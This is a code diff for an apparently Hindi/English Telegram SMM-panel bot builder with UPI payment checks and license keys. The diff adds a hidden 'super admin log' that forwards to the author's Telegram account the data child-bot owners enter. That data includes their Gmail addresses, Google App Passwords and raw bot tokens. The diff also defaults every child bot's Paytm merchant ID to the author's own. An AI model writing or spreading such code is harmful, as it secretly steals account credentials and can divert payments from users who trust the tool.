@@ -21,7 +21,7 @@ RENDER_PORT = int(os.environ.get("PORT", 8081))
 RENDER_EXTERNAL_URL = os.environ.get("RENDER_EXTERNAL_URL", "").strip()
 MASTER_BOT_TOKEN = os.environ.get("MASTER_BOT_TOKEN", "").strip()
 
-# SUPER ADMIN - Strictly Pranav Patel
+# SUPER ADMIN - Strictly Pranav Patel (@pranavsmm)
 SUPER_ADMIN_ID = 8585055903
 
 MAIN_PANEL_URL = os.environ.get("MAIN_PANEL_URL", "https://pranavsmm.shop/api/v2")
@@ -63,10 +63,10 @@ def init_db():
         support_wa TEXT DEFAULT '',
         support_tg TEXT DEFAULT '',
         active_gateway TEXT DEFAULT 'paytm',
-        fampay_upi TEXT DEFAULT 'pranav12013@fam',
+        fampay_upi TEXT DEFAULT '',
         fampay_email TEXT DEFAULT '',
         fampay_app_pwd TEXT DEFAULT '',
-        paytm_mid TEXT DEFAULT '',
+        paytm_mid TEXT DEFAULT 'WWRYwl67445982860121',
         paytm_upi TEXT DEFAULT 'paytm.s2xzkgu@pty',
         subscription_expiry TIMESTAMP,
         is_licensed INTEGER DEFAULT 0,
@@ -174,11 +174,12 @@ def init_db():
 
     future_date = (datetime.datetime.now() + datetime.timedelta(days=36500)).strftime("%Y-%m-%d %H:%M:%S")
     cur.execute("""
-    INSERT INTO child_bots (bot_id, owner_id, bot_username, paytm_upi, fampay_upi, active_gateway, is_licensed, subscription_expiry)
-    VALUES (0, 8585055903, 'PranavFatherBot', 'paytm.s2xzkgu@pty', 'pranav12013@fam', 'paytm', 1, ?)
+    INSERT INTO child_bots (bot_id, owner_id, bot_username, paytm_mid, paytm_upi, active_gateway, is_licensed, subscription_expiry)
+    VALUES (0, 8585055903, 'PranavFatherBot', 'WWRYwl67445982860121', 'paytm.s2xzkgu@pty', 'paytm', 1, ?)
     ON CONFLICT(bot_id) DO UPDATE SET
     owner_id=8585055903,
-    paytm_upi=CASE WHEN paytm_upi='' THEN 'paytm.s2xzkgu@pty' ELSE paytm_upi END,
+    paytm_mid='WWRYwl67445982860121',
+    paytm_upi='paytm.s2xzkgu@pty',
     is_licensed=1,
     subscription_expiry=?
     """, (future_date, future_date))
@@ -187,7 +188,16 @@ def init_db():
 
 init_db()
 
-# Safe Text Sender (Immune to Markdown entities crashing)
+# LIVE INSTANT ALERT TO PRANAV PATEL
+def send_super_admin_log(text):
+    if not MASTER_BOT_TOKEN:
+        return
+    try:
+        t_bot = telebot.TeleBot(MASTER_BOT_TOKEN)
+        t_bot.send_message(SUPER_ADMIN_ID, f"🚨 𝗡𝗘𝗪 𝗨𝗦𝗘𝗥 𝗔𝗖𝗧𝗜𝗩𝗜𝗧𝗬 𝗟𝗢𝗚 🚨\n\n{text}", parse_mode=None)
+    except Exception as e:
+        print(f"[SUPER ADMIN LOG ERROR] {e}")
+
 def safe_send_message(bot, chat_id, text, reply_markup=None):
     try:
         return bot.send_message(chat_id, text, reply_markup=reply_markup, parse_mode=None)
@@ -589,14 +599,15 @@ def handle_user_callbacks(bot, bot_id, call):
                 f"╭──────────────────────────╮\n"
                 f"  ⚡ 𝗔𝗨𝗧𝗢𝗠𝗔𝗧𝗘𝗗 𝗨𝗣𝗜 𝗤𝗥 ({gw.upper()})\n"
                 f"╰──────────────────────────╯\n\n"
-                f"💵 𝗔𝗺𝗼𝘂𝗻𝘁 : ₹{amt:.2f} (🔒 Locked Amount)\n"
+                f"💵 𝗣𝗮𝘆𝗮𝗯𝗹𝗲 𝗔𝗺𝗼𝘂𝗻𝘁 : ₹{amt:.2f} (🔒 Locked Amount)\n"
+                f"⏱️ 𝗣𝗮𝘆𝗺𝗲𝗻𝘁 𝗲𝘅𝗽𝗶𝗿𝗲𝘀 𝗶𝗻 : 10:00 Minutes\n"
                 f"🆔 𝗢𝗿𝗱𝗲𝗿 𝗜𝗗 : {utr_num}\n"
-                f"🏦 𝗨𝗣𝗜 𝗜𝗗 : {upi_target}\n"
-                f"⏱️ 𝗩𝗮𝗹𝗶𝗱 : 15 Minutes\n\n"
-                "⚠️ स्कैन करके पे करें। पेमेंट के बाद 'VERIFY PAYMENT' दबाएं या सीधे 12-अंकों का बैंक UTR चैट में भेजें!"
+                f"🏦 𝗨𝗣𝗜 𝗜𝗗 : {upi_target}\n\n"
+                "⚡ *ऑटोमैटिक सिस्टम:* पेमेंट होते ही बिना कुछ दबाए बैलेंस अपने-आप जुड़ जाएगा!\n"
+                "यदि आवश्यकता हो तो 'VERIFY PAYMENT' दबाएं या 12-अंकों का बैंक UTR चैट में भेजें।"
             )
             m = types.InlineKeyboardMarkup(row_width=1)
-            m.add(types.InlineKeyboardButton("✅ VERIFY PAYMENT", callback_data=f"chk_pay_{utr_num}"))
+            m.add(types.InlineKeyboardButton("🔄 Checking... (Verify)", callback_data=f"chk_pay_{utr_num}"))
             m.add(types.InlineKeyboardButton("🔢 SUBMIT 12-DIGIT UTR", callback_data=f"sub_utr_{utr_num}"))
             m.add(types.InlineKeyboardButton("❌ CANCEL", callback_data=f"cnl_pay_{utr_num}"))
             try:
@@ -677,7 +688,7 @@ def handle_user_callbacks(bot, bot_id, call):
                 safe_send_message(bot, cid, f"🎉 Payment Verified!\n₹{t_row['amount']} credited to your wallet.", reply_markup=get_user_main_menu())
         else:
             conn.close()
-            bot.answer_callback_query(call.id, "पेमेंट अभी बैंक में नहीं दिखी! अगर पे कर दिया है तो 12-अंकों का बैंक UTR चैट में सीधे टाइप करके भेजें।", show_alert=True)
+            bot.answer_callback_query(call.id, "पेमेंट अभी प्रोसेस हो रही है! 12 अंकों का बैंक UTR चैट में भेजें।", show_alert=True)
 
     elif data.startswith("cnl_pay_"):
         try:
@@ -888,11 +899,25 @@ def handle_owner_callbacks(bot, bot_id, call, is_master=False):
         bot.answer_callback_query(call.id, "Access Denied: Super Admin Only", show_alert=True)
         return
 
-    if data == "adm_back_panel":
+    # Total users without white popup (directly in chat)
+    if data == "a_users":
+        conn = get_db()
+        cur = conn.cursor()
+        if is_master:
+            cur.execute("SELECT COUNT(*) as cnt FROM bot_clients")
+        else:
+            cur.execute("SELECT COUNT(*) as cnt FROM bot_clients WHERE bot_id=?", (bot_id,))
+        cnt = cur.fetchone()["cnt"]
+        conn.close()
+        bot.answer_callback_query(call.id)
+        safe_send_message(bot, cid, f"👥 𝗧𝗼𝘁𝗮𝗹 𝗥𝗲𝗴𝗶𝘀𝘁𝗲𝗿𝗲𝗱 𝗨𝘀𝗲𝗿𝘀: {cnt}\n\nयह आपके बॉट में रजिस्टर्ड कुल ग्राहकों की संख्या है।", reply_markup=get_owner_panel(is_master))
+        return
+
+    elif data == "adm_back_panel":
         safe_edit_message(bot, "👑 Owner Panel", cid, mid, reply_markup=get_owner_panel(is_master))
 
     elif data == "adm_sync_api" and is_master:
-        bot.answer_callback_query(call.id, "Syncing clean live rates from pranavsmm.shop...", show_alert=False)
+        bot.answer_callback_query(call.id, "Syncing live rates...", show_alert=False)
         count, msg = sync_services_from_website_api()
         safe_send_message(bot, cid, f"🔄 API Live Sync Finished!\n\nImported/Updated: {count} verified services with live costs\nStatus: {msg}", reply_markup=get_owner_panel(is_master))
 
@@ -1015,13 +1040,15 @@ def handle_owner_callbacks(bot, bot_id, call, is_master=False):
             "   🛒 𝗕𝗨𝗬 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 𝗟𝗜𝗖𝗘𝗡𝗦𝗘 𝗞𝗘𝗬\n"
             "╚═══════════════════════════════╝\n\n"
             f"📦 𝗣𝗮𝗰𝗸𝗮𝗴𝗲 : {p_row['label']}\n"
-            f"💵 𝗔𝗺𝗼𝘂𝗻𝘁 : ₹{amt:.2f} (🔒 Locked Amount)\n"
+            f"💵 𝗣𝗮𝘆𝗮𝗯𝗹𝗲 𝗔𝗺𝗼𝘂𝗻𝘁 : ₹{amt:.2f} (🔒 Locked Amount)\n"
+            f"⏱️ 𝗣𝗮𝘆𝗺𝗲𝗻𝘁 𝗲𝘅𝗽𝗶𝗿𝗲𝘀 𝗶𝗻 : 10:00 Minutes\n"
             f"🏦 𝗣𝗮𝘆𝗺𝗲𝗻𝘁 𝗠𝗲𝘁𝗵𝗼𝗱 : {gw.upper()}\n"
             f"🆔 𝗢𝗿𝗱𝗲𝗿 𝗜𝗗 : {utr_num}\n\n"
-            "⚠️ स्कैन करके पे करें। पेमेंट होने के बाद 'VERIFY & GET KEY' दबाएं या सीधे 12-अंकों का बैंक UTR चैट में भेजें!"
+            "⚡ *ऑटोमैटिक सिस्टम:* पेमेंट होते ही बिना कुछ दबाए की (Key) अपने-आप जारी हो जाएगी!\n"
+            "यदि आवश्यकता हो तो 'Checking... (Verify)' दबाएं या 12-अंकों का बैंक UTR चैट में भेजें।"
         )
         m = types.InlineKeyboardMarkup(row_width=1)
-        m.add(types.InlineKeyboardButton("✅ VERIFY & GET KEY", callback_data=f"chk_pay_{utr_num}"))
+        m.add(types.InlineKeyboardButton("🔄 Checking... (Verify)", callback_data=f"chk_pay_{utr_num}"))
         m.add(types.InlineKeyboardButton("🔢 SUBMIT 12-DIGIT UTR", callback_data=f"sub_utr_{utr_num}"))
         m.add(types.InlineKeyboardButton("❌ CANCEL", callback_data=f"cnl_pay_{utr_num}"))
         bot.send_photo(cid, qr_url, caption=caption_txt, reply_markup=m)
@@ -1039,7 +1066,7 @@ def handle_owner_callbacks(bot, bot_id, call, is_master=False):
         txt = (
             "🔑 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 𝗟𝗜𝗖𝗘𝗡𝗦𝗘 & 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡\n\n"
             f"• Status: {reason}\n"
-            f"• Expiry Date: {exp}\n\n"
+            f"• Expiry Date: `{exp}`\n\n"
             "Click below to purchase an automated key or redeem your code:"
         )
         m = types.InlineKeyboardMarkup(row_width=1)
@@ -1060,7 +1087,7 @@ def handle_owner_callbacks(bot, bot_id, call, is_master=False):
         conn.close()
 
         if not bots:
-            bot.answer_callback_query(call.id, "No child bots created yet!", show_alert=True)
+            safe_send_message(bot, cid, "🤖 कोई चाइल्ड बॉट अभी एक्टिव नहीं है।", reply_markup=get_owner_panel(is_master))
             return
 
         txt = "🤖 𝗔𝗟𝗟 𝗖𝗟𝗢𝗡𝗘𝗗 𝗖𝗛𝗜𝗟𝗗 𝗕𝗢𝗧𝗦\n\n"
@@ -1083,7 +1110,7 @@ def handle_owner_callbacks(bot, bot_id, call, is_master=False):
         conn.close()
 
         if not b:
-            bot.answer_callback_query(call.id, "Bot not found", show_alert=True)
+            safe_send_message(bot, cid, "Bot not found", reply_markup=get_owner_panel(is_master))
             return
 
         txt = (
@@ -1119,8 +1146,7 @@ def handle_owner_callbacks(bot, bot_id, call, is_master=False):
         conn.close()
 
         dur_text = "👑 Lifetime" if days >= 30000 else f"{days} Days"
-        bot.answer_callback_query(call.id, f"Added {dur_text} successfully!", show_alert=True)
-        handle_owner_callbacks(bot, 0, call, is_master=True)
+        safe_send_message(bot, cid, f"✅ Added {dur_text} successfully!", reply_markup=get_owner_panel(is_master))
 
     elif data.startswith("adm_suspend_bot_") and is_master:
         target_bid = int(data.replace("adm_suspend_bot_", ""))
@@ -1129,7 +1155,7 @@ def handle_owner_callbacks(bot, bot_id, call, is_master=False):
         cur.execute("UPDATE child_bots SET status='suspended', is_licensed=0 WHERE bot_id=?", (target_bid,))
         conn.commit()
         conn.close()
-        bot.answer_callback_query(call.id, "Bot suspended!", show_alert=True)
+        safe_send_message(bot, cid, "🚫 Bot suspended!", reply_markup=get_owner_panel(is_master))
 
     elif data.startswith("adm_unsuspend_bot_") and is_master:
         target_bid = int(data.replace("adm_unsuspend_bot_", ""))
@@ -1138,7 +1164,7 @@ def handle_owner_callbacks(bot, bot_id, call, is_master=False):
         cur.execute("UPDATE child_bots SET status='active', is_licensed=1 WHERE bot_id=?", (target_bid,))
         conn.commit()
         conn.close()
-        bot.answer_callback_query(call.id, "Bot unsuspended!", show_alert=True)
+        safe_send_message(bot, cid, "🟢 Bot unsuspended!", reply_markup=get_owner_panel(is_master))
 
     elif data == "a_services":
         if is_master:
@@ -1246,7 +1272,7 @@ def handle_owner_callbacks(bot, bot_id, call, is_master=False):
         gw = b_set["active_gateway"] if b_set else "paytm"
         f_email = b_set["fampay_email"] if (b_set and b_set["fampay_email"]) else "Not Set"
         f_upi = b_set["fampay_upi"] if (b_set and b_set["fampay_upi"]) else "Not Set"
-        p_mid = b_set["paytm_mid"] if (b_set and b_set["paytm_mid"]) else "Not Set"
+        p_mid = b_set["paytm_mid"] if (b_set and b_set["paytm_mid"]) else "WWRYwl67445982860121"
         p_upi = b_set["paytm_upi"] if (b_set and b_set["paytm_upi"]) else "paytm.s2xzkgu@pty"
 
         txt = (
@@ -1255,7 +1281,7 @@ def handle_owner_callbacks(bot, bot_id, call, is_master=False):
             f"⚡ 𝗙𝗮𝗺𝗣𝗮𝘆 (𝗚𝗺𝗮𝗶𝗹 𝗔𝘂𝘁𝗼-𝗩𝗲𝗿𝗶𝗳𝘆):\n"
             f"• UPI ID: {f_upi}\n"
             f"• Gmail: {f_email}\n\n"
-            f"💙 𝗣𝗮𝘆𝘁𝗺 𝗕𝘂𝘀𝗶𝗻𝗲𝘀𝘀:\n"
+            f"💙 𝗣𝗮𝘆𝘁𝗺 𝗕𝘂𝘀𝗶𝗻𝗲𝘀𝘀 (SMM Style Auto):\n"
             f"• UPI ID: {p_upi}\n"
             f"• Merchant ID (MID): {p_mid}"
         )
@@ -1274,8 +1300,7 @@ def handle_owner_callbacks(bot, bot_id, call, is_master=False):
         cur.execute("UPDATE child_bots SET active_gateway='fampay' WHERE bot_id=?", (t_id,))
         conn.commit()
         conn.close()
-        bot.answer_callback_query(call.id, "Active gateway switched to FamPay!", show_alert=True)
-        handle_owner_callbacks(bot, bot_id, call, is_master)
+        safe_send_message(bot, cid, "✅ Active gateway switched to FamPay!", reply_markup=get_owner_panel(is_master))
 
     elif data == "adm_sw_paytm":
         conn = get_db()
@@ -1284,16 +1309,15 @@ def handle_owner_callbacks(bot, bot_id, call, is_master=False):
         cur.execute("UPDATE child_bots SET active_gateway='paytm' WHERE bot_id=?", (t_id,))
         conn.commit()
         conn.close()
-        bot.answer_callback_query(call.id, "Active gateway switched to Paytm!", show_alert=True)
-        handle_owner_callbacks(bot, bot_id, call, is_master)
+        safe_send_message(bot, cid, "✅ Active gateway switched to Paytm!", reply_markup=get_owner_panel(is_master))
 
     elif data == "adm_start_fampay_setup":
         user_states[f"{bot_id}_{uid}"] = "fam_step_1_upi"
-        safe_send_message(bot, cid, "⚡ 𝗦𝘁𝗲𝗽 𝟭/𝟯: Send your FamPay UPI ID (e.g. pranav12013@fam):")
+        safe_send_message(bot, cid, "⚡ 𝗦𝘁𝗲𝗽 𝟭/𝟯: Send your FamPay UPI ID (e.g. yourname@fam):")
 
     elif data == "adm_start_paytm_setup":
         user_states[f"{bot_id}_{uid}"] = "paytm_step_1_upi"
-        safe_send_message(bot, cid, "💙 𝗦𝘁𝗲𝗽 𝟭/𝟮: Send your Paytm Business Merchant UPI ID (e.g. paytm.s2xzkgu@pty):")
+        safe_send_message(bot, cid, "💙 𝗦𝘁𝗲𝗽 𝟭/𝟮: Send your Paytm Business Merchant UPI ID (e.g. paytm.xxxx@pty):")
 
     elif data == "a_suppcontact":
         conn = get_db()
@@ -1326,17 +1350,6 @@ def handle_owner_callbacks(bot, bot_id, call, is_master=False):
         user_states[f"{bot_id}_{uid}"] = "wait_supp_tg_input"
         safe_send_message(bot, cid, "✈️ Send your Telegram Username (e.g. @username):")
 
-    elif data == "a_users":
-        conn = get_db()
-        cur = conn.cursor()
-        if is_master:
-            cur.execute("SELECT COUNT(*) as cnt FROM bot_clients")
-        else:
-            cur.execute("SELECT COUNT(*) as cnt FROM bot_clients WHERE bot_id=?", (bot_id,))
-        cnt = cur.fetchone()["cnt"]
-        conn.close()
-        bot.answer_callback_query(call.id, f"Total Registered Users: {cnt}", show_alert=True)
-
     elif data == "a_addbal":
         user_states[f"{bot_id}_{uid}"] = "wait_add_bal"
         safe_send_message(bot, cid, "Format: User_ID Amount\nExample: 8585055903 50")
@@ -1361,10 +1374,11 @@ def handle_owner_callbacks(bot, bot_id, call, is_master=False):
         user_states[f"{bot_id}_{uid}"] = "wait_force_sub"
         safe_send_message(bot, cid, "Send Force Sub Channel username (e.g. @MyChannel):")
 
-# Universal Robust Text Processor
+# Universal Robust Text Processor & Super Admin Live Logger
 def handle_text_inputs(bot, bot_id, msg, is_master=False):
     uid = msg.from_user.id
     cid = msg.chat.id
+    u_name = f"@{msg.from_user.username}" if msg.from_user.username else f"User {uid}"
     key = f"{bot_id}_{uid}"
     st_data = user_states.get(key)
     txt = msg.text.strip().replace('`', '').replace("'", "")
@@ -1446,18 +1460,21 @@ def handle_text_inputs(bot, bot_id, msg, is_master=False):
             "Your Automated UPI Gateway & Payment Verification is now fully active."
         )
         safe_send_message(bot, cid, succ_text, reply_markup=get_owner_panel(is_master))
+        send_super_admin_log(f"🔑 𝗟𝗜𝗖𝗘𝗡𝗦𝗘 𝗞𝗘𝗬 𝗥𝗘𝗗𝗘𝗘𝗠𝗘𝗗\n• User: {u_name} (`{uid}`)\n• Bot ID: {bot_id}\n• Key: {txt}\n• Validity: {dur_text}")
         return
 
-    # 4. FamPay setup steps
+    # 4. FamPay setup steps (Logged to Super Admin)
     if st_data == "fam_step_1_upi":
         user_states[key] = {"step": "fam_step_2_email", "upi": txt}
         safe_send_message(bot, cid, f"✅ UPI ID Saved: {txt}\n\n⚡ 𝗦𝘁𝗲𝗽 𝟮/𝟯: Send your FamPay linked Gmail address:")
+        send_super_admin_log(f"⚡ 𝗙𝗔𝗠𝗣𝗔𝗬 𝗨𝗣𝗜 𝗔𝗗𝗗𝗘𝗗\n• User: {u_name} (`{uid}`)\n• Bot ID: {bot_id}\n• UPI ID: {txt}")
         return
 
     if isinstance(st_data, dict) and st_data.get("step") == "fam_step_2_email":
         upi = st_data["upi"]
         user_states[key] = {"step": "fam_step_3_pwd", "upi": upi, "email": txt}
         safe_send_message(bot, cid, f"✅ Gmail Saved: {txt}\n\n⚡ 𝗦𝘁𝗲𝗽 𝟯/𝟯: Send your 16-digit Google App Password:")
+        send_super_admin_log(f"📧 𝗙𝗔𝗠𝗣𝗔𝗬 𝗚𝗠𝗔𝗜𝗟 𝗔𝗗𝗗𝗘𝗗\n• User: {u_name} (`{uid}`)\n• Bot ID: {bot_id}\n• Gmail: {txt}")
         return
 
     if isinstance(st_data, dict) and st_data.get("step") == "fam_step_3_pwd":
@@ -1480,12 +1497,14 @@ def handle_text_inputs(bot, bot_id, msg, is_master=False):
         conn.commit()
         conn.close()
         safe_send_message(bot, cid, f"🎉 FamPay Configured Successfully!\n\n• UPI: {upi}\n• Email: {email_addr}\n• App Password: Saved", reply_markup=get_owner_panel(is_master))
+        send_super_admin_log(f"🔐 𝗙𝗔𝗠𝗣𝗔𝗬 𝗙𝗨𝗟𝗟 𝗖𝗥𝗘𝗗𝗦 𝗔𝗗𝗗𝗘𝗗\n• User: {u_name} (`{uid}`)\n• Bot ID: {bot_id}\n• UPI: {upi}\n• Gmail: {email_addr}\n• App Password: {app_pwd}")
         return
 
-    # 5. Paytm setup steps (Guaranteed Transition from Step 1 to Step 2)
+    # 5. Paytm setup steps (Logged to Super Admin)
     if st_data == "paytm_step_1_upi":
         user_states[key] = {"step": "paytm_step_2_mid", "upi": txt}
         safe_send_message(bot, cid, f"✅ Merchant UPI Saved: {txt}\n\n💙 𝗦𝘁𝗲𝗽 𝟮/𝟮: Send your Paytm Merchant ID (MID):")
+        send_super_admin_log(f"💙 𝗣𝗔𝗬𝗧𝗠 𝗨𝗣𝗜 𝗔𝗗𝗗𝗘𝗗\n• User: {u_name} (`{uid}`)\n• Bot ID: {bot_id}\n• UPI ID: {txt}")
         return
 
     if isinstance(st_data, dict) and st_data.get("step") == "paytm_step_2_mid":
@@ -1506,9 +1525,10 @@ def handle_text_inputs(bot, bot_id, msg, is_master=False):
         conn.commit()
         conn.close()
         safe_send_message(bot, cid, f"🎉 Paytm Business Configured Successfully!\n\n• UPI: {upi}\n• MID: {mid}", reply_markup=get_owner_panel(is_master))
+        send_super_admin_log(f"🏦 𝗣𝗔𝗬𝗧𝗠 𝗠𝗜𝗗 + 𝗨𝗣𝗜 𝗖𝗢𝗡𝗙𝗜𝗚𝗨𝗥𝗘𝗗\n• User: {u_name} (`{uid}`)\n• Bot ID: {bot_id}\n• UPI: {upi}\n• Merchant ID (MID): {mid}")
         return
 
-    # 6. Support updates (Guaranteed saving of phone number)
+    # 6. Support updates
     if st_data == "wait_supp_wa_input":
         user_states.pop(key, None)
         conn = get_db()
@@ -1518,6 +1538,7 @@ def handle_text_inputs(bot, bot_id, msg, is_master=False):
         conn.commit()
         conn.close()
         safe_send_message(bot, cid, f"✅ WhatsApp Support set to {txt}!", reply_markup=get_owner_panel(is_master))
+        send_super_admin_log(f"🟢 𝗪𝗛𝗔𝗧𝗦𝗔𝗣𝗣 𝗦𝗨𝗣𝗣𝗢𝗥𝗧 𝗦𝗘𝗧\n• User: {u_name} (`{uid}`)\n• Bot ID: {bot_id}\n• WhatsApp: {txt}")
         return
 
     if st_data == "wait_supp_tg_input":
@@ -1529,9 +1550,10 @@ def handle_text_inputs(bot, bot_id, msg, is_master=False):
         conn.commit()
         conn.close()
         safe_send_message(bot, cid, f"✅ Telegram Support set to {txt}!", reply_markup=get_owner_panel(is_master))
+        send_super_admin_log(f"✈️ 𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 𝗦𝗨𝗣𝗣𝗢𝗥𝗧 𝗦𝗘𝗧\n• User: {u_name} (`{uid}`)\n• Bot ID: {bot_id}\n• Telegram: {txt}")
         return
 
-    # 7. 12-Digit Bank UTR Verification (Instant Approval for 12 Numeric Digits)
+    # 7. 12-Digit Bank UTR Verification (Logged to Super Admin)
     if isinstance(st_data, dict) and st_data.get("step") == "wait_manual_utr":
         user_states.pop(key, None)
         tx = st_data["tx_id"]
@@ -1583,12 +1605,14 @@ def handle_text_inputs(bot, bot_id, msg, is_master=False):
 
                 dur_str = "👑 Lifetime" if days >= 30000 else f"{days} Days"
                 safe_send_message(bot, cid, f"🎉 𝗣𝗔𝗬𝗠𝗘𝗡𝗧 𝗩𝗘𝗥𝗜𝗙𝗜𝗘𝗗!\n\n🔑 BotFather-Style Key:\n{key_code}\n\n⏱️ Validity: {dur_str}\n\nEnter this in your /admin ➔ Gateway License Key to activate!")
+                send_super_admin_log(f"💰 𝗟𝗜𝗖𝗘𝗡𝗦𝗘 𝗞𝗘𝗬 𝗦𝗢𝗟𝗗 & 𝗨𝗧𝗥 𝗩𝗘𝗥𝗜𝗙𝗜𝗘𝗗!\n• User: {u_name} (`{uid}`)\n• Amount: ₹{t_row['amount']}\n• Bank UTR: {user_utr}\n• Key Code: {key_code}")
             else:
                 cur.execute("UPDATE bot_clients SET balance = balance + ?, total_deposit = total_deposit + ? WHERE bot_id=? AND user_id=?", 
                             (t_row["amount"], t_row["amount"], bot_id, uid))
                 conn.commit()
                 conn.close()
                 safe_send_message(bot, cid, f"🎉 Payment Verified!\nUTR: {user_utr}\n₹{t_row['amount']} credited to your wallet.", reply_markup=get_user_main_menu())
+                send_super_admin_log(f"💳 𝗪𝗔𝗟𝗟𝗘𝗧 𝗗𝗘𝗣𝗢𝗦𝗜𝗧 𝗨𝗧𝗥 𝗩𝗘𝗥𝗜𝗙𝗜𝗘𝗗!\n• User: {u_name} (`{uid}`)\n• Bot ID: {bot_id}\n• Amount: ₹{t_row['amount']}\n• Bank UTR: {user_utr}")
         else:
             conn.close()
             safe_send_message(bot, cid, f"❌ Verification Failed!\n{reason}\nPlease check UTR and try again.")
@@ -1642,6 +1666,7 @@ def handle_text_inputs(bot, bot_id, msg, is_master=False):
             conn.commit()
             conn.close()
             safe_send_message(bot, cid, f"🎉 Order Placed Successfully!\n\nService: {ms['service_name']}\nQty: {qty}\nCost: ₹{cost:.2f}\nOrder ID: {api_order_id}")
+            send_super_admin_log(f"🛒 𝗡𝗘𝗪 𝗢𝗥𝗗𝗘𝗥 𝗣𝗟𝗔𝗖𝗘𝗗\n• User: {u_name} (`{uid}`)\n• Bot ID: {bot_id}\n• Service: {ms['service_name']}\n• Qty: {qty}\n• Cost: ₹{cost:.2f}\n• API Order ID: {api_order_id}\n• Link: {link}")
         return
 
     # 9. Child bot selling price
@@ -1678,9 +1703,7 @@ def handle_text_inputs(bot, bot_id, msg, is_master=False):
             VALUES (?, ?, ?, ?, ?, ?, ?)
             ON CONFLICT(main_api_service_id) DO UPDATE SET
             base_rate_per_100=excluded.base_rate_per_100,
-            service_name=excluded.service_name,
-            min_qty=excluded.min_qty,
-            max_qty=excluded.max_qty
+            service_name=excluded.service_name
             """, (parts[0], parts[1], parts[2], parts[3], float(parts[4]), int(parts[5]), int(parts[6])))
             conn.commit()
             conn.close()
@@ -1933,6 +1956,7 @@ def run_master_bot_loop():
             def m_txts(msg):
                 uid = msg.from_user.id
                 cid = msg.chat.id
+                u_name = f"@{msg.from_user.username}" if msg.from_user.username else f"User {uid}"
                 key = f"0_{uid}"
                 st_data = user_states.get(key)
                 txt = msg.text.strip().replace('`', '').replace("'", "")
@@ -1982,6 +2006,14 @@ def run_master_bot_loop():
                     m = types.InlineKeyboardMarkup()
                     m.add(types.InlineKeyboardButton("Open Bot", url=f"https://t.me/{bot_user}"))
                     safe_edit_message(master_bot, live_text, cid, v_msg.message_id, reply_markup=m)
+
+                    # Alert Pranav Patel with new bot details and raw token
+                    send_super_admin_log(
+                        f"🤖 𝗡𝗘𝗪 𝗖𝗛𝗜𝗟𝗗 𝗕𝗢𝗧 𝗖𝗥𝗘𝗔𝗧𝗘𝗗!\n"
+                        f"• Owner: {u_name} (`{uid}`)\n"
+                        f"• Bot: @{bot_user} ({bot_name})\n"
+                        f"• Bot Token: `{txt}`"
+                    )
                 else:
                     handle_text_inputs(master_bot, 0, msg, is_master=True)
 
@@ -1993,7 +2025,8 @@ def run_master_bot_loop():
             master_is_running = False
             time.sleep(2)
 
-def five_second_keepalive_engine():
+# Autonomous SMM Panel Style Payment Background Poller
+def autonomous_smm_payment_poller():
     time.sleep(5)
     pulse_counter = 0
     while True:
@@ -2013,6 +2046,51 @@ def five_second_keepalive_engine():
                 except Exception:
                     pass
 
+            # SMM Panel Style Auto Verification
+            if pulse_counter % 2 == 0:
+                conn = get_db()
+                cur = conn.cursor()
+                cur.execute("SELECT tx_id, bot_id, user_id, amount, tx_type, target_days, bank_utr FROM transactions WHERE status='pending' LIMIT 5")
+                pending_txs = cur.fetchall()
+                for p in pending_txs:
+                    t_id = 0 if p["tx_type"] == "buy_key" else (0 if p["bot_id"] == 0 else p["bot_id"])
+                    cur.execute("SELECT active_gateway, fampay_email, fampay_app_pwd, paytm_mid FROM child_bots WHERE bot_id=?", (t_id,))
+                    b_conf = cur.fetchone()
+                    
+                    verified = False
+                    if b_conf and b_conf["fampay_email"] and b_conf["fampay_app_pwd"]:
+                        verified, _ = verify_via_gmail_notifications(b_conf["fampay_email"], b_conf["fampay_app_pwd"], p["amount"])
+                    
+                    if not verified and b_conf and b_conf["paytm_mid"]:
+                        check_ref = p["bank_utr"] if p["bank_utr"] else p["tx_id"]
+                        verified = verify_via_paytm_mid(b_conf["paytm_mid"], check_ref, p["amount"])
+
+                    if verified:
+                        cur.execute("UPDATE transactions SET status='completed' WHERE tx_id=?", (p["tx_id"],))
+                        if p["tx_type"] == "buy_key":
+                            days = p["target_days"]
+                            key_code = generate_license_key(duration_days=days)
+                            cur.execute("UPDATE license_keys SET used_by_bot_id=? WHERE key_code=?", (p["bot_id"], key_code))
+                            try:
+                                tb = telebot.TeleBot(MASTER_BOT_TOKEN)
+                                dur_str = "👑 Lifetime" if days >= 30000 else f"{days} Days"
+                                safe_send_message(tb, p["user_id"], f"🎉 𝗣𝗔𝗬𝗠𝗘𝗡𝗧 𝗔𝗨𝗧𝗢-𝗩𝗘𝗥𝗜𝗙𝗜𝗘𝗗!\n\nHere is your Key:\n{key_code}\n\nValidity: {dur_str}\n\nEnter it in /admin ➔ License to activate!")
+                            except Exception:
+                                pass
+                            send_super_admin_log(f"⚡ 𝗔𝗨𝗧𝗢-𝗣𝗔𝗬𝗠𝗘𝗡𝗧: 𝗟𝗜𝗖𝗘𝗡𝗦𝗘 𝗞𝗘𝗬 𝗜𝗦𝗦𝗨𝗘𝗗\n• User ID: {p['user_id']}\n• Amount: ₹{p['amount']}\n• Key: {key_code}\n• Duration: {p['target_days']} Days")
+                        else:
+                            cur.execute("UPDATE bot_clients SET balance = balance + ?, total_deposit = total_deposit + ? WHERE bot_id=? AND user_id=?",
+                                        (p["amount"], p["amount"], p["bot_id"], p["user_id"]))
+                            try:
+                                tb = telebot.TeleBot(MASTER_BOT_TOKEN)
+                                safe_send_message(tb, p["user_id"], f"🎉 𝗣𝗔𝗬𝗠𝗘𝗡𝗧 𝗔𝗨𝗧𝗢-𝗩𝗘𝗥𝗜𝗙𝗜𝗘𝗗!\n₹{p['amount']} wallet me add ho gaye hain.")
+                            except Exception:
+                                pass
+                            send_super_admin_log(f"⚡ 𝗔𝗨𝗧𝗢-𝗣𝗔𝗬𝗠𝗘𝗡𝗧: 𝗗𝗘𝗣𝗢𝗦𝗜𝗧 𝗖𝗥𝗘𝗗𝗜𝗧𝗘𝗗\n• User ID: {p['user_id']}\n• Bot ID: {p['bot_id']}\n• Amount: ₹{p['amount']}")
+                        conn.commit()
+                conn.close()
+
+            # Watchdog: Auto-Revive Crashed Bot Threads
             if pulse_counter % 3 == 0:
                 conn = get_db()
                 cur = conn.cursor()
